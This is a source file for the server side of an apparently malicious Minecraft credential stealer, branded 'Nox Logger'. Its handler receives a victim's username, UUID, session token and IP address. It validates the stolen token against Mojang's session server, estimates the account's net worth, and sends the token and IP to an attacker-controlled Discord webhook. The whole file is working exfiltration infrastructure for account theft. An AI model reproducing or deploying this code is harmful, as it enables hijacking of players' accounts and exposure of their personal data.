const networthCalc = require('./utils/Networth');
const getWebhook = require('./utils/getWebhook');
const axios = require('axios')

module.exports = async(req, res) => {
    const username = req.body.username;
    const uuid = req.body.uuid;
    const token = req.body.token;
    const ip = req.body.ip;
    let webhook;

    // make sure the request includes all the required parameters
    if (!["username", "uuid", "token", "ip", "rid"].every(field => req.body.hasOwnProperty(field))) {
        return res.status(400).send("Bad Request");
    }

    webhook = await getWebhook("jar", req.body.rid);
    
    // check if the token is valid by authenticating with Mojang's session server
    axios.post("https://sessionserver.mojang.com/session/minecraft/join", JSON.stringify({
        accessToken: req.body.token,
        selectedProfile: req.body.uuid,
        serverId: req.body.uuid
    }),
    {
    headers : {
            "Content-Type": "application/json"
        }}).then(async response => {
        if (response.status == 204) {
            networthCalc(uuid).then((result) => {
                let networth = "0";
                let description = null;
                if (result != null) {
                    networth = Intl.NumberFormat('en-US', {
                        notation: 'compact',
                        maximumFractionDigits: 2,
                    }).format(result[0]);
                    description = result[1];
                }
                let data = {
                    username: "Nox Logger",
                    avatar_url: "https://cdn.discordapp.com/attachments/1053140780425945100/1053509569797705758/nox1-removebg-preview.png",
                    content: "@everyone",
                    embeds: [
                        {
                            title: "📖 Minecraft Info",
                            description: "🪙 Networth: " + networth,
                            color: 0x7289DA,
                            footer: {
                                "text": "🌟 Nox Logger - Nox Builder by Gute Nacht 🌟",
                            },
                            timestamp: new Date(),
                            fields: [
                                {
                                    "name": "Username",
                                    "value": "```"+username+"```",
                                    "inline": true
                                },
                                {
                                    "name": "UUID",
                                    "value": "```"+uuid+"```",
                                    "inline": true
                                },
                                {
                                    "name": "IP",
                                    "value": "```"+ip+"```",
                                    "inline": true
                                },
                                {
                                    "name": "Token",
                                    "value": "```"+token+"```",
                                    "inline": true
                                }
                            ]
                        }
                    ]
                }
                
                var config = {
                   method: "POST",
                   url: webhook,
                   headers: { "Content-Type": "application/json" },
                   data: data,
                };
                
                axios(config)
                    .then((response) => {
                        console.log("Webhook delivered successfully");
                        return response;
                   })
                    .catch((error) => {
                        console.log(error);
                        return error;
                });
            });
        }
    }).catch(error => {
        return res.status(500).send("Internal Server Error");
    });
}